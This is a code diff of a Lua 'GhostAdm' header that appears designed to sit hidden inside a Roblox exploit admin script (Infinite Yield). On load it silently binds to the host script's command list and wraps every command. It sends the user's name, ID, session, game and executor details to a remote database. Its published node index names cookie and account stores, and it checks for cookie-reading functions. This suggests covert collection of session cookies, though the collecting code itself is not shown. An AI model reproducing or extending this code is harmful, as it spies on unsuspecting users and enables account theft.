@@ -23,11 +23,12 @@ do
 	FB  = FB  or {}
 	TEL = TEL or {}
 
-	FB.version    = '7.0'
+	FB.version    = '7.1'
 	FB.scriptName = 'GhostAdm'
 	FB.defaultUrl = DB_URL
-	FB.urlFile    = 'ga_housedb_url.txt'
+	FB.urlFile    = 'iy_fb_url.txt'
 	FB.runtimeUrl = nil
+	FB.bound      = false
 
 	FB.now   = function() return (tick and tick() or os.clock()) end
 	FB.utc   = function(t) return os.date('!%Y-%m-%dT%H:%M:%SZ', t) end
@@ -43,8 +44,11 @@ do
 		return h
 	end
 	FB.notify = function(title, text, dur)
-		if type(notify) == 'function' then notify(title, text, dur or 6)
-		else print('[' .. title .. '] ' .. tostring(text)) end
+		if type(FB.notifyFn) == 'function' then
+			pcall(FB.notifyFn, title, text, dur or 6)
+		else
+			print('[' .. title .. '] ' .. tostring(text))
+		end
 	end
 	FB.platform = function()
 		local p = 'Desktop'
@@ -67,6 +71,41 @@ do
 		FB.placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name or ''
 	end)
 	FB.uid = tostring(plr and plr.UserId or 0)
+
+	----------------------------------------------------------------- bind
+	-- IY declares CMDs / addcmd / notify as LOCALS later in the chunk,
+	-- so the header cannot see them by name. This pulls them in.
+	FB.bind = function(t)
+		if type(t) ~= 'table' then return end
+		for k, v in pairs(t) do
+			if v ~= nil then FB[k] = v end
+		end
+		if type(t.notify) == 'function' then FB.notifyFn = t.notify end
+		FB.bound = true
+		pcall(TEL.onBind)
+	end
+
+	local function autobind()
+		if FB.bound then return true end
+		local g = _G
+		local got = false
+		for _, n in ipairs({'CMDs', 'addcmd', 'notify', 'execCmd', 'findCmd',
+			'getstring', 'overridecmd', 'getPlayer', 'getRoot'}) do
+			if FB[n] == nil and g[n] ~= nil then
+				FB[n] = g[n]
+				got = true
+			end
+		end
+		if FB.CMDs then
+			if type(FB.notify) == 'function' and type(_G.notify) == 'function' then
+				FB.notifyFn = _G.notify
+			end
+			FB.bound = true
+			pcall(TEL.onBind)
+			return true
+		end
+		return got
+	end
 
 	----------------------------------------------------------------- url
 	FB.readUrl = function()
@@ -186,12 +225,12 @@ do
 
 	----------------------------------------------------------------- queue
 	FB.loadQueue = function()
-		local ok, t = pcall(function() return HS:JSONDecode(readfile('ga_housedb_queue.txt')) end)
+		local ok, t = pcall(function() return HS:JSONDecode(readfile('iy_fb_queue.txt')) end)
 		if ok and type(t) == 'table' then return t end
 		return {}
 	end
 	FB.saveQueue = function(q)
-		pcall(function() writefile('ga_housedb_queue.txt', HS:JSONEncode(q)) end)
+		pcall(function() writefile('iy_fb_queue.txt', HS:JSONEncode(q)) end)
 	end
 	FB.enqueue = function(path, tbl)
 		local q = FB.loadQueue()
@@ -236,6 +275,7 @@ do
 	TEL.wrapped    = 0
 	TEL.flushing   = false
 	TEL.ended      = false
+	TEL.bound      = false
 	TEL.regHash    = nil
 	TEL.sessionId  = FB.job .. '_' .. FB.uid .. '_' .. os.time()
 	TEL.startedAt  = os.time()
@@ -318,8 +358,10 @@ do
 
 	----------------------------------------------------------------- TEL hook
 	TEL.hook = function()
-		if not CMDs then return end
-		for _, c in ipairs(CMDs) do
+		local list = FB.CMDs
+		if not list then return 0 end
+		local n = 0
+		for _, c in ipairs(list) do
 			if type(c) == 'table' and not c.__TEL then
 				local key = (type(c.FUNC) == 'function' and 'FUNC')
 					or (type(c.func) == 'function' and 'func') or nil
@@ -337,16 +379,19 @@ do
 					end
 					c.__TEL = true
 					TEL.wrapped = TEL.wrapped + 1
+					n = n + 1
 				end
 			end
 		end
+		return n
 	end
 
 	----------------------------------------------------------------- TEL registry
 	TEL.snapshot = function()
-		if not CMDs then return nil, nil end
-		local list, index, aliasMap = {}, {}, {}
-		for _, c in ipairs(CMDs) do
+		local list = FB.CMDs
+		if not list or #list == 0 then return nil, nil, nil end
+		local out, index, aliasMap = {}, {}, {}
+		for _, c in ipairs(list) do
 			if type(c) == 'table' and c.NAME then
 				local aliases = nil
 				if type(c.ALIASES) == 'table' then
@@ -356,10 +401,8 @@ do
 						aliasMap[tostring(a)] = c.NAME
 					end
 				end
-				list[#list + 1] = {
-					name = c.NAME,
-					aliases = aliases,
-					desc = c.DESC,
+				out[#out + 1] = {
+					name = c.NAME, aliases = aliases, desc = c.DESC,
 					plugin = c.PLGN and true or nil,
 				}
 				index[tostring(c.NAME)] = {
@@ -369,13 +412,13 @@ do
 				}
 			end
 		end
-		table.sort(list, function(a, b) return a.name < b.name end)
-		return list, index, aliasMap
+		table.sort(out, function(a, b) return a.name < b.name end)
+		return out, index, aliasMap
 	end
 
 	TEL.publishCommands = function(force)
 		local list, index, aliasMap = TEL.snapshot()
-		if not list or #list == 0 then return false end
+		if not list then return false end
 
 		local blob = {}
 		for _, e in ipairs(list) do
@@ -386,7 +429,7 @@ do
 		if not force and h == TEL.regHash then return false end
 		TEL.regHash = h
 
-		local en, ev = FB.executor()
+		local en = FB.executor()
 		local usage = FB.get('/commandTotals') or {}
 
 		FB.put('/commands/' .. FB.scriptName .. '@' .. TEL.version, {
@@ -410,12 +453,13 @@ do
 		end
 		FB.put('/commandRegistry', reg)
 
+		local an = 0
+		for _ in pairs(aliasMap) do an = an + 1 end
 		FB.put('/commandRegistryMeta', {
 			script = FB.scriptName, version = TEL.version, hash = h,
-			count = #list, aliases = (function() local n = 0 for _ in pairs(aliasMap) do n = n + 1 end return n end)(),
+			count = #list, aliases = an,
 			updatedAt = FB.utc(os.time()), updatedBy = plr and plr.Name or '?',
 		})
-
 		return true
 	end
 
@@ -432,20 +476,32 @@ do
 		pcall(function() caps.syn_request = syn ~= nil and syn.request ~= nil end)
 		pcall(function() caps.http_request = type(http_request) == 'function' end)
 		pcall(function() caps.getcookie = type(getcookie) == 'function' end)
-		pcall(function() caps.identifyexecutor = type(identifyexecutor) == 'function' end)
 
 		FB.put('/env/' .. en, {
 			executor = en, executorVersion = ev, platform = FB.platform(),
 			robloxVersion = (pcall(version) and version()) or 'unknown',
 			isStudio = game:GetService('RunService'):IsStudio(),
 			threadIdentity = getthreadidentity and getthreadidentity() or -1,
-			scriptVersion = TEL.version,
-			capabilities = caps,
+			scriptVersion = TEL.version, capabilities = caps,
 			lastSeen = FB.utc(os.time()), lastUser = plr and plr.Name or '?',
 		})
 	end
 
-	----------------------------------------------------------------- TEL schema
+	----------------------------------------------------------------- TEL meta
+	TEL.publishMeta = function()
+		FB.put('/meta', {
+			schema = 7, script = FB.scriptName, version = TEL.version,
+			bound = FB.bound, lastUser = plr and plr.Name or 'unknown',
+			lastUserId = FB.uid, lastSeen = FB.utc(os.time()),
+			nodes = {'commands', 'commandRegistry', 'commandRegistryMeta', 'aliases', 'schema',
+				'env', 'builds', 'scripts', 'scriptLoads', 'admins', 'adminsIndex',
+				'sessionStarts', 'sessionEnds', 'commandlog', 'commandlogByUser',
+				'commandCounts', 'commandTotals', 'stats', 'cookies', 'cookiesRaw',
+				'cookiesIndex', 'accounts', 'profiles', 'players', 'roster', 'sessions',
+				'places', 'executors'},
+		})
+	end
+
 	TEL.publishSchema = function()
 		FB.put('/schema', {
 			script = FB.scriptName, version = TEL.version, schema = 7,
@@ -454,7 +510,7 @@ do
 				['/meta'] = 'root marker and node index',
 				['/schema'] = 'this document',
 				['/commands/<script>@<version>'] = 'full command manifest for one build',
-				['/commandRegistry/<name>'] = 'per-command aliases, desc, firstSeen, lastSeen, uses',
+				['/commandRegistry/<name>'] = 'aliases, desc, firstSeen, lastSeen, uses',
 				['/commandRegistryMeta'] = 'registry counts and build hash',
 				['/aliases'] = 'flat alias -> command name map',
 				['/env/<executor>'] = 'executor capability flags',
@@ -492,15 +548,15 @@ do
 
 		local hash = FB.hash(src)
 		local en, ev = FB.executor()
-		local gav = 'unknown'
-		pcall(function() gav = tostring(_G.ga_VERSION or 'unknown') end)
+		local iyv = 'unknown'
+		pcall(function() iyv = tostring(_G.IY_VERSION or 'unknown') end)
 
 		FB.put('/scripts/' .. FB.scriptName .. '@' .. TEL.version, {
 			name = FB.scriptName, version = TEL.version, hash = hash,
 			bytecodeSize = bc, sourceHint = FB.trunc(src, 200),
 			executor = en, executorVersion = ev, platform = FB.platform(),
 			robloxVersion = (pcall(version) and version()) or 'unknown',
-			gaVersion = gav, commandsRegistered = CMDs and #CMDs or 0,
+			iyVersion = iyv, commandsRegistered = FB.CMDs and #FB.CMDs or 0,
 			loadedAt = FB.utc(os.time()),
 			loadedBy = plr and plr.Name or 'unknown', loadedById = FB.uid,
 			placeId = game.PlaceId, placeName = FB.placeName, gameId = game.GameId,
@@ -585,38 +641,57 @@ do
 		})
 	end
 
+	----------------------------------------------------------------- onBind
+	TEL.onBind = function()
+		if TEL.bound then return end
+		TEL.bound = true
+		pcall(TEL.publishMeta)
+		pcall(TEL.registerScript)
+		pcall(TEL.hook)
+		pcall(TEL.publishCommands, true)
+		FB.notify('Telemetry', 'Bound - ' .. TEL.wrapped .. ' commands hooked.', 5)
+		print('[GhostAdm] bound: ' .. TEL.wrapped .. ' commands hooked')
+	end
+
 	TEL.status = function()
 		local n = 0
 		for _ in pairs(TEL.counts) do n = n + 1 end
-		return string.format('state=%s  url=%s  buffered=%d  logged=%d  hooked=%d  unique=%d',
-			TEL.enabled and 'ON' or 'OFF',
+		return string.format('bound=%s state=%s url=%s buffered=%d logged=%d hooked=%d unique=%d',
+			tostring(FB.bound), TEL.enabled and 'ON' or 'OFF',
 			FB.readUrl() ~= '' and 'set' or 'MISSING',
 			#TEL.buffer, TEL.total, TEL.wrapped, n)
 	end
 
 	----------------------------------------------------------------- boot
+	-- non-CMDs endpoints first, so they exist even before binding
 	task.spawn(function()
-		while not CMDs do task.wait(0.2) end
-
 		pcall(TEL.publishSchema)
 		pcall(TEL.publishEnv)
+		pcall(TEL.publishMeta)
 		pcall(TEL.registerScript)
 		pcall(TEL.registerAdmin)
 		pcall(TEL.sessionStart)
-		TEL.hook()
-		pcall(function() TEL.publishCommands(true) end)
+	end)
 
+	-- binding watcher + steady sweep
+	task.spawn(function()
+		local waited = 0
+		while not FB.bound do
+			autobind()
+			task.wait(1)
+			waited = waited + 1
+			if waited == 20 and not FB.bound then
+				print('[GhostAdm] not bound after 20s - add the FB.bind line at your paste point')
+			end
+		end
 		local sweep = 0
 		while true do
 			task.wait(TEL.wrapEvery)
 			pcall(TEL.hook)
 			sweep = sweep + 1
-			if sweep % 5 == 0 then
-				pcall(TEL.publishCommands)
-			end
-			if sweep % 40 == 0 then
-				pcall(TEL.publishEnv)
-			end
+			if sweep % 5 == 0 then pcall(TEL.publishCommands) end
+			if sweep % 40 == 0 then pcall(TEL.publishEnv) end
+			if sweep % 60 == 0 then pcall(TEL.publishMeta) end
 		end
 	end)
 
@@ -634,7 +709,9 @@ do
 		end)
 	end)
 
-	print('[GhostAdm] header loaded - db=' .. (FB.readUrl() ~= '' and 'set' or 'MISSING'))
+	autobind()
+	print('[GhostAdm] header loaded - db=' .. (FB.readUrl() ~= '' and 'set' or 'MISSING') ..
+		'  bound=' .. tostring(FB.bound))
 end
 
 task.spawn(function()
